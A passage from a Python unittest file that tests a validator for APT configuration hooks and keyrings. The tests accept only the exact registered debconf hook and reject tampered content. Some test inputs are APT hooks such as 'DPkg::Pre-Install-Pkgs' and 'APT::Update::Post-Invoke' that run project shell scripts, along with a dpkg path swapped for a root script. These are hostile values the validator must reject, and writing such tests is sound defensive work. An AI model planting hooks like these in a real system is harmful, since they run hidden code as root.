                defaults.replace('"/usr/bin/dpkg"', '"/project/root-script"'),
                '#include "/project/hook";\n', 'APT::Solver "project";'):
            self.rejected(lambda: self.d.dependency_apt_options(value, effective=True))

    def test_default_hook_requires_exact_registered_package_content(self):
        hook = 'DPkg::Pre-Install-Pkgs {"/usr/sbin/dpkg-preconfigure --apt || true";};\n'
        path = '/etc/apt/apt.conf.d/70debconf'
        registered_path = str(pathlib.Path(path))
        digest = hashlib.md5(hook.encode()).hexdigest()
        status = types.SimpleNamespace(is_file=lambda: True, stat=lambda: types.SimpleNamespace(st_size=100))
        def protected(value): return status
        def run(command):
            if '-S' in command: return 'debconf: ' + registered_path + '\n'
            return ' ' + registered_path + ' ' + digest + '\n'
        with mock.patch.object(self.d, 'dependency_protected', protected), mock.patch.object(self.d, 'dependency_tool', lambda name: '/usr/bin/' + name), mock.patch.object(self.d, 'dependency_run', run):
            self.d.dependency_apt_options(hook, path)
            self.rejected(lambda: self.d.dependency_apt_options(hook + '# modified\n', path))
        for owner, checksum in (('model-hook', digest), ('debconf', None), ('debconf', '0' * 32)):
            def bad_run(command):
                return owner + ': ' + registered_path + '\n' if '-S' in command else (
                    ' ' + registered_path + ' ' + checksum + '\n' if checksum is not None else '')
            with mock.patch.object(self.d, 'dependency_protected', protected), mock.patch.object(self.d, 'dependency_tool', lambda name: '/usr/bin/' + name), mock.patch.object(self.d, 'dependency_run', bad_run), mock.patch.object(self.d.pathlib.Path, 'exists', return_value=False):
                self.rejected(lambda: self.d.dependency_apt_options(hook, path))
        self.rejected(lambda: self.d.dependency_apt_options(hook))
        self.rejected(lambda: self.d.dependency_apt_options('DPkg::Pre-Install-Pkgs {"sh /project/script";};'))

    def test_binary_keyring_uses_registered_bytes_without_utf8_decode(self):
        content = b'\x99\xff\x00\x80binary-keyring'
        with mock.patch.object(self.d, 'dependency_bytes', return_value=content), mock.patch.object(self.d, 'dependency_registered') as registered:
            self.d.dependency_key('/usr/share/keyrings/ubuntu-archive-keyring.gpg', 'APT')
            registered.assert_called_once_with('/usr/share/keyrings/ubuntu-archive-keyring.gpg', {'ubuntu-keyring'}, content)
            self.rejected(lambda: self.d.dependency_key('/usr/share/keyrings/project.gpg', 'APT'))
            self.rejected(lambda: self.d.dependency_key('/usr/share/keyrings/debian-archive-keyring.gpg', 'APT'))

    def test_root_owned_unmanaged_and_project_hook_are_not_proven_by_permission(self):
        hook = 'APT::Update::Post-Invoke {"sh /project/custom";};\n'
        status = types.SimpleNamespace(is_file=lambda: True, stat=lambda: types.SimpleNamespace(st_size=100))
        with mock.patch.object(self.d, 'dependency_protected', return_value=status), mock.patch.object(self.d, 'dependency_tool', lambda name: '/usr/bin/' + name), mock.patch.object(self.d, 'dependency_run', return_value='project-owned: /etc/apt/apt.conf.d/99project\n'):
            self.rejected(lambda: self.d.dependency_apt_options(hook, '/etc/apt/apt.conf.d/99project'))


if __name__ == '__main__':
    unittest.main()
